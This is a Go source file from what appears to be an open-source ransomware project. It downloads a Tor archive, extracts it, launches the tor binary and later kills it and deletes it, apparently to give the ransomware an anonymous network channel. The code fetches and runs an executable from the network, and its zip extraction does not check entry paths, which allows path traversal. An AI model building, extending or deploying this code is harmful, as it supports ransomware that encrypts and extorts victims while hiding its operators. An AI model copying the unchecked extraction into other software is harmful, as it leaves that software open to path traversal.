//go:build linux && arm
// +build linux,arm

package tor

import (
	"archive/zip"
	"bufio"
	"bytes"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/mauri870/ransomware/utils"
)

const (
	IsReadyMessage = "Bootstrapped 100%: Done"
	TOR_ZIP_URL    = "https://www.torproject.org/dist/torbrowser/7.5.3/tor-linux-arm-0.3.2.10.zip"
)

type Tor struct {
	RootPath string
	Cmd      *exec.Cmd
}

func New(rootPath string) *Tor {
	return &Tor{RootPath: rootPath}
}

func (t *Tor) Download(dst io.Writer) error {
	resp, err := http.Get(TOR_ZIP_URL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	_, err = io.Copy(dst, &utils.DownloadProgressReader{
		Reader: resp.Body,
		Lenght: resp.ContentLength,
	})

	return err
}

func (t *Tor) DownloadAndExtract() error {
	if ok := utils.FileExists(t.GetExecutable()); ok {
		return nil
	}

	var buf bytes.Buffer
	err := t.Download(&buf)
	if err != nil {
		return err
	}

	zipWriter, err := zip.NewReader(bytes.NewReader(buf.Bytes()), int64(buf.Len()))
	if err != nil {
		return err
	}

	for _, file := range zipWriter.File {
		err = t.extractFile(file)
		if err != nil {
			return err
		}
	}

	return nil
}

func (t *Tor) extractFile(file *zip.File) error {
	path := filepath.Join(t.RootPath, file.Name)
	if file.FileInfo().IsDir() {
		os.MkdirAll(path, file.Mode())
		return nil
	}

	fileReader, err := file.Open()
	if err != nil {
		return err
	}
	defer fileReader.Close()

	targetFile, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode())
	if err != nil {
		return err
	}
	defer targetFile.Close()

	if _, err := io.Copy(targetFile, fileReader); err != nil {
		return err
	}
	return nil
}

func (t *Tor) Start() error {
	cmd := t.GetExecutable()
	t.Cmd = exec.Command(cmd)

	stdout, err := t.Cmd.StdoutPipe()
	if err != nil {
		return err
	}

	err = t.Cmd.Start()
	if err != nil {
		return err
	}

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), IsReadyMessage) {
			break
		}
	}

	return nil
}

func (t *Tor) GetExecutable() string {
	return fmt.Sprintf("%s/tor", t.RootPath)
}

func (t *Tor) Kill() error {
	err := t.Cmd.Process.Kill()
	if err != nil {
		return err
	}

	return nil
}

func (t *Tor) Clean() error {
	dir, _ := filepath.Split(t.GetExecutable())
	err := os.RemoveAll(dir)
	if err != nil {
		return err
	}
	return nil
}
